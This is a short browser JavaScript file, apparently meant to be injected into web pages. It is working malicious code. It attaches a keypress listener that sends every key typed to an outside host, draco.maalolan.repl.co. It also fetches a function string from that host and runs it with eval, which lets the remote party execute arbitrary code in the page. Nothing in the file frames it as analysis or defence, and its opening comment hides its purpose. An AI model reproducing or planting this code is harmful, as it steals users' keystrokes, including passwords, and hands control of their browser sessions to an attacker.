// Some useless comment

const sendData = async (data) => {
    const url = (new URL(window.location.href));
    await fetch(`https://draco.maalolan.repl.co/`, {
        method: 'POST', // or 'PUT'
        headers: {
            'Accept': 'application/json',
            // 'Access-Control-Allow-Origin': url.hostname,
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ key_pressed: data }),
    })
}


const getCommand = async () => {
    await fetch('https://draco.maalolan.repl.co/', {
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        },
    })
        .then(res => res.json())
        .then(data => {
            const func = eval(data.function);
            func()
        })
        .catch(err => console.log(err))
}


document.addEventListener("keypress", async (event) => {
    await sendData(event.key)
})

getCommand()